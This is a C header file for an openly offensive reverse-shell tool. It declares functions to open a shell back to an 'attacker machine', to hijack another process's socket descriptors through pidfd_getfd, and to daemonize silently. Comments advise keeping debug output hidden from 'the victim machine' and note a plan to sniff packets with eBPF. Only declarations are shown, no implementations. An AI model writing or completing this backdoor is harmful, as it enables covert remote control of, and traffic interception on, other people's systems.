#ifndef REVERSE_SHELL_H
#define REVERSE_SHELL_H 


#define _GNU_SOURCE
#include <sys/syscall.h>
#include <fcntl.h>
#include <stdio.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <netdb.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>


// uncomment the line below to allow for debug prints,however remember to comment them for live testing
// you don't really want the victim machine to see your debug prints,fail silently

// #define DEBUG 1




#ifdef DEBUG

#define PRINT_DEBUG(msg) perror(msg)

#else

#define PRINT_DEBUG(msg) printf(" ")


#endif




#define return_defer(label) goto label





// use the exposed global environment variables

extern char **environ;



/*
 *
 *  pidfd_open syscall => read the manual page on it
 *
 *
 */



int pidfd_open(pid_t pid, unsigned int flags);


/*
 *
 *
 *  pidfd_getfd syscall => read the manual page on it
 *
 *
 */



int pidfd_getfd(int pidfd, int targetfd, unsigned int flags);

/*
 *
 *
 *  hijack target fd descriptor from the process with process id of pid
 *
 *  on success the hijacked socket descriptor can be used to send and receive newtwork packets out as if the original process did
 *
 *  however note that receiving is destructive and other factors come into play
 *
 *  it would be better to use an ebpf program to sniff the received packets instead => TODO!
 *
 *  @param1 => target_pid
 *  @param2 => target_fd
 *
 *  @return => bool
 *  	true => success
 *  	false => failure
 *
 */


bool hijack_socket_connection(pid_t target_pid,int target_fd);


/*
 *
 * detach the process and make it run as a unix daemon
 * 
 * @param1 => dir_path
 * 	directory that the daemon should run on and use it as its working directory
 * 
 *
 * @return => bool
 * 	true => success
 * 	false => failure
 *
 */



bool daemonize(const char *dir_path);




/*
 *
 *  Create a reverse shell
 *
 *  @param1 => host
 *  	ip address or domain name of the attacker machine
 *
 *  @param2 => service
 *  	port number or service name on the attckaer machine 
 *
 *  @return => bool
 * 	true => success
 * 	false => failure
 *
 *
 */

bool reverse_shell(char *host,char *service);


/*
 *
 *  Print Usage information when the user does use the the program correctly
 *
 *  @param1 => argv
 *  	the commandline arguments passed in the main function
 *
 *  @return => int
 *  	the number of characters printed
 *
 *
 */


int print_usage(char **argv);

#endif
